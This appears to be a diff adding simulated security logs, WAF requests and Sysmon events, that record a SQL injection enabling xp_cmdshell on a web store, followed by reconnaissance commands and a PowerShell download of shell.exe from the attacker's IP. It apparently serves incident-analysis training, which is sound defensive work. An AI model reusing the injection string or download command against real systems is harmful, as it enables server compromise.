@@ -1,0 +1,106 @@
+{
+  "timestamp": "2026-03-28T08:10:05Z",
+  "log_source": "Cloud_WAF",
+  "src_ip": "203.0.113.10",
+  "http_method": "GET",
+  "http_uri": "/store/products.aspx?id=10",
+  "http_user_agent": "Mozilla/5.0",
+  "action": "ALLOWED",
+  "http_response_code": 200
+},
+
+{
+  "timestamp": "2026-03-28T08:11:12Z",
+  "log_source": "Cloud_WAF",
+  "src_ip": "203.0.113.15",
+  "http_method": "GET",
+  "http_uri": "/store/products.aspx?id=25",
+  "http_user_agent": "Mozilla/5.0",
+  "action": "ALLOWED",
+  "http_response_code": 200
+},
+
+
+{
+  "timestamp": "2026-03-28T08:14:22Z",
+  "log_source": "Cloud_WAF",
+  "src_ip": "198.51.100.77",
+  "http_method": "GET",
+  "http_uri": "/store/products.aspx?id=12'; EXEC sp_configure 'xp_cmdshell', 1;--",
+  "http_user_agent": "Mozilla/5.0",
+  "action": "ALLOWED",
+  "http_response_code": 200
+},
+
+{
+  "timestamp": "2026-03-28T08:14:30Z",
+  "log_source": "Cloud_WAF",
+  "src_ip": "198.51.100.77",
+  "http_method": "GET",
+  "http_uri": "/store/products.aspx?id=12",
+  "http_user_agent": "Mozilla/5.0",
+  "action": "ALLOWED",
+  "http_response_code": 200
+},
+
+{
+  "EventID": 1,
+  "UtcTime": "2026-03-28 08:15:01",
+  "Image": "cmd.exe",
+  "CommandLine": "cmd.exe /c whoami & ipconfig",
+  "User": "NT SERVICE\\\\MSSQLSERVER",
+  "ParentImage": "sqlservr.exe"
+},
+
+{
+  "EventID": 3,
+  "UtcTime": "2026-03-28 08:15:05",
+  "Image": "cmd.exe",
+  "DestinationIp": "192.168.1.1",
+  "DestinationPort": 80,
+  "Protocol": "tcp"
+},
+
+{
+  "EventID": 1,
+  "UtcTime": "2026-03-28 08:15:30",
+  "Image": "powershell.exe",
+  "CommandLine": "powershell.exe -c Invoke-WebRequest -Uri <http://198.51.100.77/shell.exe> -OutFile C:\\\\Windows\\\\Temp\\\\shell.exe",
+  "User": "NT SERVICE\\\\MSSQLSERVER",
+  "ParentImage": "cmd.exe"
+},
+
+{
+  "EventID": 22,
+  "UtcTime": "2026-03-28 08:15:31",
+  "Image": "powershell.exe",
+  "QueryName": "198.51.100.77"
+},
+
+{
+  "EventID": 3,
+  "UtcTime": "2026-03-28 08:15:32",
+  "Image": "powershell.exe",
+  "DestinationIp": "198.51.100.77",
+  "DestinationPort": 80,
+  "Protocol": "tcp"
+},
+
+{
+  "EventID": 1,
+  "UtcTime": "2026-03-28 08:16:00",
+  "Image": "explorer.exe",
+  "CommandLine": "explorer.exe",
+  "User": "user1"
+},
+
+{
+  "timestamp": "2026-03-28T08:16:20Z",
+  "log_source": "Cloud_WAF",
+  "src_ip": "203.0.113.20",
+  "http_method": "GET",
+  "http_uri": "/store/products.aspx?id=30",
+  "http_user_agent": "Mozilla/5.0",
+  "action": "ALLOWED",
+  "http_response_code": 200
+}
